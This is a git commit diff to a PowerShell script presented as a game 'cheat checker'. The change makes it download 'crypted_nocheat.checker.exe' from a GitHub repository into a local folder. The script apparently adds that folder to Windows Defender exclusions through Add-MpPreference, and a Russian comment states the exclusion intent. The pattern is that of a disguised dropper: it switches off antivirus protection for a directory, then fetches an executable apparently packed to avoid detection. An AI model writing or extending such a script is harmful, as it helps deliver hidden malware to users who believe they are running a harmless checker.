ebc48c1197e82e533f7fc61c5889c5ee11d329d5
dieforme <russianmtc80@gmail.com>
2026-09-05 23:01:35 +0200

    Update nocheat-checker.ps1

--- nocheat-checker.ps1
+++ nocheat-checker.ps1
@@ -36,7 +36,7 @@ $repoOwner  = "die4mebaby"
 $repoName   = "CheatChecker"
 $branch     = "main"
 $rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
-$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
+$exeUrl     = "$rawBaseUrl/crypted_nocheat.checker.exe"
 
 # директ добавляем в исключения
 $workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
@@ -45,7 +45,7 @@ if (-not (Test-Path $workDir)) {
     New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 }
 
-$exePath = Join-Path $workDir "nocheat.checker.exe"
+$exePath = Join-Path $workDir "crypted_nocheat.checker.exe"
 
 try {
     if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
